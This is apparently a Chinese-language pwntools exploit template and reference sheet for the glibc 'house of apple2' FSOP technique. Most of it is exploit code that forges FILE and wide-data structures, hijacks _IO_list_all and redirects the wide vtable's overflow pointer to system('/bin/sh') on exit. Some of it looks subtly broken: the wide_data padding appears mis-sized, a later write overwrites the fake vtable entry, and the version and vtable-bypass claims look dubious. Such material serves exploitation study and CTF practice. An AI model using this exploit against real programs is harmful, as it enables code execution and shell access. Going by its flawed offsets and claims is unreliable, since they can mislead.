
# 模板概览与入口

本模板提供了 `house of apple2` 攻击的 `pwntools` EXP 骨架。这是一种基于 `_IO_FILE` (FSOP) 的高级堆利用技术，适用于在高版本 glibc（如 2.27+）中，当 `__free_hook` 等传统 RCE 路径被移除时使用。攻击的前提是已拥有**任意地址写**和 **libc 地址泄露**两大原语。

攻击的核心思想是伪造一个 `_IO_FILE_plus` 结构体和相应的 vtable，然后劫持 `_IO_list_all` 链表头指向伪造的 `FILE`。当程序正常退出时，`_IO_flush_all_lockp` 会遍历此链表并调用 vtable 中的 `overflow` 函数指针，从而触发我们预设的 `system` 调用。

**核心入口代码片段 (以 glibc 2.27 为例)**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')
libc = ELF('./libc.so.6')

# --- 漏洞利用 ---
# 1. 泄露 libc 和堆地址 (假设已完成)
# libc.address = ...
# heap_base = ...

# 2. 计算关键地址
io_list_all = libc.symbols['_IO_list_all']
system_addr = libc.symbols['system']
vtable_addr = libc.symbols['_IO_wfile_jumps'] # 可利用的 vtable

# 3. 在堆上伪造 FILE 结构和 vtable
log.info("Constructing fake FILE structure on the heap...")
fake_file_addr = heap_base + 0x100 # 选择一个可控的堆地址

# 伪造的 vtable，只需覆盖 overflow 指针
fake_vtable = fake_file_addr + 0x100 
# aribtrary write: fake_vtable + 24 = system_addr 
# 0x18 is the offset of overflow in _IO_jump_t for wide file
arbitrary_write(fake_vtable + 0x18, system_addr)


# 伪造 _IO_FILE_plus 结构
file_struct = b"/bin/sh\x00" # system 参数
file_struct = file_struct.ljust(0x20, b'\x00')
file_struct += p64(1) # _IO_write_base < _IO_write_ptr
file_struct += p64(2) # to satisfy _IO_write_ptr > _IO_write_base
# ... 填充其他字段以通过检查 ...
file_struct = file_struct.ljust(0x88, b'\x00')
file_struct += p64(fake_file_addr + 0x200) # _lock = 可写地址
file_struct = file_struct.ljust(0xa0, b'\x00')
file_struct += p64(fake_file_addr + 0xe0)      # _wide_data 指针
file_struct = file_struct.ljust(0xc0, b'\x00')
file_struct += p64(0)                         # _mode = 0
file_struct = file_struct.ljust(0xd8, b'\x00')
file_struct += p64(vtable_addr)               # vtable 指针，指向原始 vtable

# 伪造 _IO_wide_data 和 vtable 指针
wide_data_struct = p64(0) * 29
wide_data_struct += p64(fake_vtable) # _wide_vtable 指针

# 将伪造结构写入堆
arbitrary_write(fake_file_addr, file_struct)
arbitrary_write(fake_file_addr + 0xe0, wide_data_struct)

# 4. 劫持 _IO_list_all
log.info(f"Overwriting _IO_list_all to point to {hex(fake_file_addr)}")
arbitrary_write(io_list_all, fake_file_addr)

# 5. 触发 exit()
log.info("Triggering exit() to get shell...")
# io.sendlineafter(b'> ', b'exit_command') # 触发程序正常退出

io.interactive()

```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - `_IO_list_all`: 全局 `FILE` 链表的头指针，是 FSOP 攻击的入口点，必须劫持它。
  - `_IO_FILE_plus.vtable`: 指向 `_IO_jump_t` 结构（虚函数表）的指针。
  - `_IO_jump_t.__overflow` (或 `__sync`, `__xsputn` 等): vtable 中可以被 `_IO_flush_all_lockp` 或其他 IO 函数触发的函数指针，是最终执行 `system` 的位置。
  - `_IO_wide_data._wide_vtable`: 在 `house of apple2` 中，实际被劫持的是宽字符 vtable 的 `overflow`。

- **关键结构体 (Key Structures)**
  - **`_IO_FILE_plus`**: 伪造的核心，一个巨大的结构体，内部字段必须精确构造以绕过 `_IO_flush_all_lockp` 中的各种检查。
    - `_flags`: 控制刷新行为。
    - `_mode`: 必须为 0 才能进入宽字符处理流程。
    - `_IO_write_ptr` 和 `_IO_write_base`: 必须满足 `_IO_write_ptr > _IO_write_base`。
    - `_lock`: 必须指向一个可写地址。
  - **`_IO_wide_data`**: 宽字符数据结构，其 `_wide_vtable` 字段是 `house of apple2` 的直接攻击目标。
  - **Fake Vtable**: 一个伪造的函数指针数组，在 `overflow` 的位置填上 `system` 的地址。

- **主要攻击面 (Main Attack Surfaces)**
  - **任意地址写**: 用于修改 `_IO_list_all`，以及在堆上布置伪造的结构体。
  - **程序退出机制**: `exit()` 函数或 `main` 函数的正常返回，这是触发 `_IO_flush_all_lockp` 的标准方式。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **精确适配 glibc 版本**: **这是最重要的一步**。使用 `GDB` 和 `pahole` 工具，或直接阅读对应版本的 glibc 源码，精确确定 `_IO_FILE_plus` 和 `_IO_wide_data` 中所有关键字段的偏移。模板中的偏移仅适用于特定版本（如 2.27），其他版本必须修改。
  2.  **完善检查条件**: 仔细阅读 `_IO_flush_all_lockp` 的源码，将所有 `if` 条件都翻译为伪造 `FILE` 时的字段设置。例如，`_flags` 的值需要包含 `_IO_IS_FILEBUF` 但不能包含 `_IO_NO_WRITES` 等。
  3.  **选择合适的 Vtable 和函数指针**: 虽然 `_IO_wfile_jumps` 的 `overflow` 是经典目标，但在某些 glibc 版本或特定场景下，可能需要利用 `_IO_str_jumps` 的 `sync` 函数指针等其他目标。选择哪个取决于哪个更容易被触发且约束更少。
  4.  **绕过 Vtable 验证 (glibc >= 2.24)**:
      -   高版本 glibc 会验证 vtable 指针是否位于 `__libc_IO_vtables` 段内。
      -   **绕过思路**: 不再将 `_IO_FILE_plus.vtable` 直接指向堆上的假 vtable，而是指向一个合法的 vtable（如 `_IO_str_jumps`），同时伪造 `_IO_FILE` 中的 `_vtable_offset` 字段，利用 `vtable + offset` 的指针计算，使其最终指向我们想要调用的 `system` 地址。这需要更精巧的地址运算。
  5.  **自动化结构体生成**: 编写一个 Python 函数，接收 `libc` 对象和 `system` 地址作为参数，自动生成符合目标版本要求的、完整的 `_IO_FILE_plus` 和 `_IO_wide_data` 字节流。这能极大提升 EXP 的可读性和可移植性。
  6.  **寻找其他触发方式**: 除了 `exit()`，任何能导致 `fflush(stdout)` 或类似 IO 刷新操作的程序功能，都可能成为触发 FSOP 的备选路径。例如，某些程序在处理完一个请求后会手动刷新日志文件。
